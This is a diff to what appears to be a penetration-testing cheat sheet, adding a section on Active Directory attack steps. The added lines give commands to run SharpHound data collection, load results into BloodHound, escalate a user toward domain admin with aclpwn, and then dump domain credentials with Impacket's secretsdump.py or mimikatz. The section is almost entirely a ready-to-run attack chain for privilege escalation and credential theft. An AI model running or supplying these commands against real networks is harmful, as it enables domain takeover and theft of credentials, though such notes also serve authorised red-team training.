@@ -68,3 +68,19 @@ Checkout Impacket scripts
 
 if you have access rights on the machine you also can use mimikatz. 
 Upload it and try it out. 
+
+
+## BloodHound & aclpwn
+
+Using BloodHound you can generate a path from owned principals to admin domains
+
+1. Upload SharpHound.ps1
+2. Exec PS `C:\..\ Import-Module .\SharpHound.ps1`
+3. Exec PS `C:\..\ Invoke-BloodHound -CollectionMethod All -DomainController DC -LdapUser USER -LdapPass PASSWORD -IgnoreLdapCert`
+4. Download XYZ-BloodHound.zip
+5. start neo4j `neo4j console &`
+6. start BH `bloodhound`
+7. upload zip file
+8. use aclpwn `aclpwn -f USER -ft User -t ADMIN_DOMAIN -d DOMAIN -du neo4j -dp neo4jpass -s IP -u USER -p PASSWORD`
+9. if successfull you can now use Impackets secretdump.py 'secretsdump.py DOMAIN/USER:PASSWORD@IP'
+9.1 or use mimikatz 
